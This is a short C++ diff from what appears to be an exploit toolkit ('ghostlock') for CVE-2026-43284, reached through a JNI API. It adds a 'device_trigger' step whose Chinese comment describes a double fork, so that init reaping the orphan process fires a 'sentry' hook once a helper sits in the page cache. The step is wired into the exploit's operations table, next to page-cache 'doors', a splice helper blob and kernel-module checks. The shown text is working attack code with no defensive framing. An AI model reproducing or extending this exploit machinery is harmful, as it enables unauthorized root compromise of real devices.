@@ -22,6 +22,7 @@
 #include "backend/cve_2026_43284/embed/splicehelper_blob.hpp"
 #include "backend/cve_2026_43284/hook/sentry_hook.hpp"
 #include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
+#include "backend/cve_2026_43284/steps/pagecache_steps.hpp"
 #include "backend/cve_2026_43284/access_params.hpp"
 #include "backend/cve_2026_43284/lkm/module_facts.hpp"
 #include "jni/api_43284.hpp"
@@ -146,7 +147,19 @@ namespace ghostlock::jni {
         }
     }
 
-        backend::cve_2026_43284::SaMaterial sa_material_of(const Init43284Values &params) noexcept {
+        /**
+     *  触发：双 fork，让 init 收尸时由 sentry 开火（helper 必须已在页缓存里）。
+     *
+     *  复用 steps 里的同一个实现；它的返回值就是具名失败原因（成功为 nullptr），所以这里直译成 bool，
+     *  具名那一层由调用方给（trigger-refused）。
+     */
+    bool device_trigger(const Init43284Values &, const Trigger43284Values &request, void *) noexcept {
+        const char *const who = ghostlock::backend::cve_2026_43284::steps::trigger_orphan(
+            static_cast<std::uint32_t>(request.delayMs));
+        return who == nullptr;
+    }
+
+    backend::cve_2026_43284::SaMaterial sa_material_of(const Init43284Values &params) noexcept {
         backend::cve_2026_43284::SaMaterial sa{};
         sa.spi = static_cast<std::uint32_t>(params.spi);
         sa.encap_port = static_cast<std::uint16_t>(params.encapPort);
@@ -216,6 +229,7 @@ namespace ghostlock::jni {
         ops.hook_plan = &device_hook_plan;
         ops.resolve = &device_resolve;
         ops.module_check = &device_module_check;
+        ops.trigger = &device_trigger;
         ops.wait_terminal = &device_wait_terminal;
         return ops;
     }
